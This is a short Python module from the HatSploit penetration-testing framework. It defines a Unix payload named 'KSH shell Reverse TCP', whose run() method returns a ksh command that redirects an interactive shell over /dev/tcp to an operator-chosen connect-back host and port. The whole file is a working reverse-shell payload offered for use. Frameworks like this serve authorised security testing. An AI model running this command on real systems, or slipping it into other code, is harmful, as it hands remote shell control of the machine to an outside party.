#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "single",
        'Name': "KSH shell Reverse TCP",
        'Payload': "unix/generic/ksh_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "KSH shell reverse TCP payload.",
        'Architecture': "generic",
        'Platform': "unix",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        connback_host = self.handler['CBHOST']
        connback_port = self.handler['CBPORT']

        payload = f"ksh -c 'ksh >/dev/tcp/{connback_host}/{connback_port} 2>&1 <&1'"
        return payload
